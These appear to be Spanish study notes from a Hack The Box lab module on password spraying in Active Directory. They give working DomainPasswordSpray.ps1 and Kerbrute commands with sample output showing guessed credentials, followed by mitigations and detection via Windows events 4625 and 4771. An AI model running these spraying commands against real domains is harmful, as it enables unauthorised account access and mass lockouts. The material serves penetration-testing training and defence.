
## 1. Password Spraying desde Windows

Cuando disponemos de un punto de apoyo en un equipo Windows unido al dominio, podemos utilizar **DomainPasswordSpray.ps1** para realizar un ataque de Password Spraying.

Si estamos autenticados en el dominio, la herramienta puede automatizar varias tareas:

- Obtener una lista de usuarios desde Active Directory.
    
- Consultar la política de contraseñas del dominio.
    
- Identificar el umbral de bloqueo de cuentas.
    
- Excluir usuarios deshabilitados.
    
- Excluir cuentas que estén cerca de alcanzar el umbral de bloqueo.
    
- Probar una contraseña contra los usuarios seleccionados.
    
- Guardar las credenciales válidas encontradas en un archivo.
    

También permite proporcionar una lista de usuarios manualmente cuando no estamos autenticados en el dominio.

---

## 2. Utilizar DomainPasswordSpray.ps1

### Importar el módulo

```
Import-Module .\DomainPasswordSpray.ps1
```

### Ejecutar el Password Spraying

```
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

### Parámetros

|Parámetro|Descripción|
|---|---|
|`-Password`|Contraseña que se probará contra los usuarios.|
|`-OutFile`|Archivo donde se guardarán las autenticaciones correctas.|
|`-ErrorAction SilentlyContinue`|Suprime los mensajes de error no terminantes de PowerShell.|

**Importante:** el comando del ejemplo utiliza la cuenta del dominio actual para obtener la lista de usuarios y la política de contraseñas. La herramienta solicita confirmación antes de comenzar las pruebas.

### Ejemplo de ejecución

```
[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No
```

La herramienta informa de que ha encontrado 2923 usuarios y que el umbral de bloqueo más bajo del dominio es de cinco intentos. También indica que excluirá a los usuarios que estén a un intento de alcanzar dicho umbral.

Una vez confirmada la operación, comienza a probar la contraseña seleccionada.

### Ejemplo de credenciales encontradas

```
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```

Los resultados indican que las credenciales de `sgage` y `tjohnson` son válidas para la contraseña probada.

El archivo `spray_success` permite conservar los resultados para utilizarlos posteriormente durante la enumeración autorizada del dominio.

## 3. Utilizar Kerbrute desde Windows

También podemos utilizar Kerbrute desde un host Windows. En el laboratorio de HTB, la herramienta está disponible en el directorio `C:\Tools`.

El procedimiento de Password Spraying es el mismo que desde Linux: proporcionar el dominio, el controlador de dominio, la lista de usuarios y la contraseña que se probará.

### Sintaxis

```
kerbrute passwordspray -d <DOMINIO> --dc <IP_DC> <LISTA_USUARIOS> <CONTRASEÑA>
```

### Parámetros

|Parámetro|Descripción|
|---|---|
|`passwordspray`|Ejecuta un ataque de pulverización de contraseñas.|
|`-d`|Especifica el dominio de Active Directory.|
|`--dc`|Indica la dirección IP del controlador de dominio.|
|`<LISTA_USUARIOS>`|Archivo con los usuarios objetivo.|
|`<CONTRASEÑA>`|Contraseña que se probará.|

# 4. Mitigaciones contra Password Spraying

La defensa más eficaz consiste en combinar diferentes medidas de seguridad. Ninguna medida aislada elimina por completo el riesgo.

## 4.1. Autenticación multifactor (MFA)

La autenticación multifactor añade un segundo factor de autenticación, por ejemplo:

- Notificaciones push en un dispositivo móvil.
    
- Contraseñas de un solo uso (OTP).
    
- Claves RSA.
    
- Confirmaciones mediante SMS.
    

MFA puede reducir considerablemente el riesgo de acceso no autorizado mediante contraseñas obtenidas por Password Spraying.

**Limitación:** algunas implementaciones pueden revelar si el nombre de usuario y la contraseña son correctos, aunque se deniegue el acceso por faltar el segundo factor. Por ello, las credenciales podrían seguir siendo reutilizables en otros servicios que no estén protegidos por MFA.

Es importante proteger también los portales y servicios externos.

## 4.2. Restricción de acceso

No todas las cuentas de dominio necesitan acceder a todas las aplicaciones.

Aplicando el **principio de mínimo privilegio**, debemos limitar el acceso a cada aplicación a los usuarios que realmente lo necesitan.

Esto reduce el número de cuentas que pueden utilizarse para acceder a un servicio.

## 4.3. Reducir el impacto de una explotación exitosa

Para limitar las consecuencias de una cuenta comprometida:

- Utilizar cuentas separadas para las tareas administrativas.
    
- Aplicar permisos específicos para cada aplicación.
    
- Segmentar la red para limitar el movimiento lateral.
    
- Evitar que una cuenta de usuario estándar tenga privilegios innecesarios.
    

Si un atacante compromete un sistema, estas medidas pueden dificultar que amplíe su acceso a otros equipos.

## 4.4. Higiene de contraseñas

Las organizaciones pueden reducir la eficacia del Password Spraying mediante:

- El uso de contraseñas largas y difíciles de adivinar, como frases de contraseña.
    
- La restricción de contraseñas comunes.
    
- El bloqueo de contraseñas basadas en nombres de meses o estaciones.
    
- La prohibición de variaciones previsibles del nombre de la empresa.
    

El objetivo es evitar que una contraseña común funcione contra un número elevado de usuarios.

## 4.5. Política de bloqueo de cuentas

La política de bloqueo debe configurarse cuidadosamente.

Una política demasiado restrictiva puede permitir que un atacante provoque una denegación de servicio al bloquear muchas cuentas en poco tiempo, obligando a los administradores a desbloquearlas manualmente.

**Idea clave:** la política debe equilibrar la protección contra intentos de autenticación maliciosos y la disponibilidad de las cuentas legítimas.

# 5. Detección de Password Spraying

La detección se basa en identificar patrones anómalos de autenticación y correlacionar los eventos generados.

## 5.1. Indicadores de un posible ataque

Algunas señales son:

- Numerosos bloqueos de cuentas en un intervalo corto.
    
- Muchos intentos de inicio de sesión fallidos.
    
- Intentos contra usuarios válidos e inexistentes.
    
- Un volumen elevado de solicitudes a una misma aplicación o URL.
    
- Fallos de autenticación distribuidos entre muchas cuentas.
    

Un único evento fallido no confirma un ataque. Lo importante es analizar la cantidad, la frecuencia, las cuentas afectadas y el contexto de los intentos.

## 5.2. Eventos de Windows relevantes

|ID de evento|Descripción|Relevancia|
|---|---|---|
|`4625`|Una cuenta no pudo iniciar sesión.|Una cantidad elevada de fallos en poco tiempo puede indicar Password Spraying.|
|`4771`|Falló la preautenticación de Kerberos.|Puede indicar intentos de autenticación Kerberos fallidos, incluidos los relacionados con Password Spraying.|

### Evento 4625

Debe vigilarse el aumento de fallos de inicio de sesión en el registro de seguridad del controlador de dominio.

Una regla de detección puede correlacionar numerosos fallos dentro de un intervalo determinado para generar una alerta.

### Evento 4771

También deben supervisarse los fallos de preautenticación de Kerberos.

El material destaca que un atacante puede evitar los intentos de autenticación SMB y utilizar otros mecanismos de autenticación, por lo que no conviene limitar la detección a un único protocolo.

Para detectar estos eventos correctamente, es necesario tener habilitado el registro correspondiente de Kerberos.

# 6. Password Spraying externo

Aunque esta parte queda fuera del alcance del módulo, el material explica que también puede realizarse Password Spraying contra servicios accesibles desde Internet que utilizan autenticación de Active Directory.

Entre los objetivos habituales se encuentran:

- Microsoft 365.
    
- Outlook Web y Exchange.
    
- Exchange Web Access.
    
- Skype for Business y Lync Server.
    
- Portales de Microsoft Remote Desktop Services (RDS).
    
- Portales de Citrix con autenticación de Active Directory.
    
- Soluciones VDI, como VMware Horizon.
    
- Portales VPN que utilizan autenticación de Active Directory.
    
- Aplicaciones web personalizadas integradas con Active Directory.
    

**Concepto clave:** proteger únicamente el inicio de sesión interno no es suficiente. Los servicios externos también deben contar con controles de autenticación adecuados, MFA y mecanismos de detección.

---

# 7. Siguiente paso: enumeración con credenciales

Una vez obtenidas credenciales válidas, podemos comenzar a investigar el dominio mediante herramientas de enumeración autenticada.

El objetivo es identificar:

- Usuarios y grupos.
    
- Permisos y relaciones entre cuentas.
    
- Equipos y servicios accesibles.
    
- Posibilidades de movimiento lateral.
    
- Oportunidades para ampliar privilegios.
    

La información obtenida con diferentes herramientas permite construir una imagen más completa del entorno de Active Directory.

```

```

## Eventos de Windows

- **4625:** fallo de inicio de sesión.
    
- **4771:** fallo de preautenticación de Kerberos.
    

## Medidas defensivas

- Implementar MFA.
    
- Aplicar el principio de mínimo privilegio.
    
- Separar las cuentas administrativas de las cuentas de uso diario.
    
- Segmentar la red.
    
- Rechazar contraseñas comunes y previsibles.
    
- Configurar cuidadosamente la política de bloqueo.
    
- Correlacionar los fallos de autenticación y generar alertas.
    
- Proteger tanto los servicios internos como los expuestos a Internet.
    

## Conceptos que debes recordar

- `DomainPasswordSpray.ps1` automatiza la recopilación de usuarios y la consulta de la política cuando se ejecuta con el contexto de dominio apropiado.
    
- `-Password` especifica la contraseña que se probará.
    
- `-OutFile` guarda los resultados.
    
- MFA reduce el riesgo, pero no garantiza que unas credenciales obtenidas no puedan reutilizarse en otros servicios.
    
- Los eventos `4625` y `4771` son relevantes para investigar posibles ataques de Password Spraying.
    
- Una política de bloqueo mal diseñada puede facilitar ataques de denegación de servicio.
    
- Después de obtener credenciales válidas, el siguiente paso es la enumeración autenticada del dominio.
